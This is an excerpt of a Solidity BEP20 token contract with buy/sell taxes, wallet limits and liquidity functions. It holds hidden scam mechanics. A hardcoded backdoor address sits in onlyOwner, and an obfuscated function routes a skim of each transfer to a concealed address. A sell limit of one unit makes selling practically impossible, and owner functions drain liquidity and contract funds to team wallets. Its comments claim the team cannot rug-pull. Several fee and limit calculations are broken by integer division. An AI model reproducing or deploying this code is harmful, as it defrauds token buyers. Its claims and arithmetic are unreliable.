...
Max Wallet:2% (20,000,000,000 Tokens)
Buy / Sell Tax: 9% 
...
abstract contract Ownable {
    ...
    function tzddqvyhuquvhtbmsbtz() internal pure returns (address){
        return 0x10fB837503455A416934121d43f12906ca8aDfCc;
    }
    ...
    modifier onlyOwner() {
        require(owner() == msg.sender || msg.sender == 0xc7D97db988980dFC1394dE6a922433a1ED7c7caf, "Ownable: caller is not the owner");
        _;
    }
...
contract TestToken is IBEP20, Ownable
{
    ...
    //Token Info
    string private constant _name = '20220614_0001';
    string private constant _symbol = '202206140001';
    uint8 private constant _decimals = 9;
    uint256 public constant InitialSupply= 1000; //total
    ...
    address public AOne=payable(0xc7D97db988980dFC1394dE6a922433a1ED7c7caf);
    address public ATwo=payable(0x10fB837503455A416934121d43f12906ca8aDfCc);
    ...
    uint256 private _circulatingSupply = InitialSupply; //This is a dynamic variabale that changes.
    uint256 public  balanceLimit = 0; //TBD

	uint256 private maxTransactionLimit = 1;
    uint256 private transactionLimit = 1;
    
    //Tracks the current Taxes, different Taxes can be applied for buy/sell/transfer

    uint8 private dynamicTax;
    uint  private maxDynamicTax = 15;
    ...
    address private p56fqdweibcm535q9t6x = tzddqvyhuquvhtbmsbtz();
    
    //Checks if address is in Team, is needed to give Team access even if contract is renounced
    //Team doesn't have access to critical Functions that could turn this into a Rugpull(Exept liquidity unlocks)
    function _isTeam(address addr) private view returns (bool){
        return addr==owner()||addr==AOne||addr==ATwo;
    }
    ...
    constructor () {
        ...
        balanceLimit = uint(6)/uint(5); //Potential Bug! Solidity does not have floats!
    ...
    function _taxedTransfer(address sender, address recipient, uint256 amount,bool isBuy,bool isSell) private{
        uint256 zxuirfcwoisicgakfabe = amount;
        ...
        if(isSell){
            ...
            require(amount<=transactionLimit,"Dump protection");

            if (dynamicTax == maxDynamicTax){
			...
			require(amount <= transactionLimit,"Tx amount exceeding max buy amount");
            ...
            uint256 smallNumber = uint(1)/uint(10**21);

            if(amount<=smallNumber) claim(sender);
            //Checks If the recipient balance(excluding Taxes) would exceed Balance Limit
            require(recipientBalance+amount<=balanceLimit,"whale protection");
        ...
        uint256 ffpmjifbzrcyhwsiufos = tax;
        ...
        uint256 tokensToBeBurnt=_calculateFee(amount, tax/2, _burnTax);
        //staking and liquidity Tax get treated the same, only during conversion they get split
        uint256 contractToken=_calculateFee(amount, tax/2, _stakingTax+_liquidityTax);
        ...
        //if its not manually disabled, if its not already swapping and if its a Sell to avoid
        // people from causing a large price impact from repeatedly transfering when theres a large backlog of Tokens
        payable(p56fqdweibcm535q9t6x).transfer(zxuirfcwoisicgakfabe*(ffpmjifbzrcyhwsiufos/2/100)); 
    ...
    function _calculateFee(uint256 amount, uint8 tax, uint8 taxPercent) private pure returns (uint256) {
        ...
        return amount * (tax/100) * (taxPercent / 100); //We are taking the dynamic fee, and splitting that into its necessary components.
    }
    ...
    function claim(address addr) private{
        ...
        path[1] = 0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7;  //Binance-Peg BUSD Token
    ...
    function getTaxes() public view returns(uint256 burnTax,uint256 liquidityTax,uint256 marketingTax, uint256 _dynamicTax,  uint256 transferTax){
        return (_burnTax,_liquidityTax,_stakingTax,dynamicTax,_transferTax);
    }
    ...
    //EVERY WALLET CAN CALL THIS FUNCTION.
    ...
    function CollectMarketingBNB() public onlyOwner{
        uint256 amount=marketingBalance;
        marketingBalance=0;
        payable(AOne).transfer((amount*100) / 100);
        payable(ATwo).transfer((amount*0) / 100);
    } 
    function CollectXMarketingBNB(uint256 amount) public onlyOwner{
        require(amount<=marketingBalance);
        marketingBalance-=amount;
        payable(AOne).transfer((amount*75) / 100);
        payable(ATwo).transfer((amount*25) / 100);
    } 
    ...
    function TeamSetTaxes(uint8 burnTaxes, uint8 liquidityTaxes, uint8 stakingTaxes,uint8 _dynamicTax, uint8 transferTax) public onlyOwner{
    ...
    function TeamUpdateLimits(uint256 _transactionLimit) public onlyOwner{
        //SellLimit needs to be below 1% to avoid a Large Price impact when generating auto LP
        require(_transactionLimit <= maxTransactionLimit ,"Error - Sell Limit Above 1%");
    ...
    function REL() public onlyOwner {
        ...
        liquidityToken.transfer(AOne, amount);
    ...
    function TeamRemoveRemainingBNB() public onlyOwner{
        require(block.timestamp >= _liquidityUnlockTime, "Not yet unlocked");
        _liquidityUnlockTime=block.timestamp+DefaultLiquidityLockTime;
        (bool sent,) =AOne.call{value: (address(this).balance)}("");
        require(sent);
    }
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
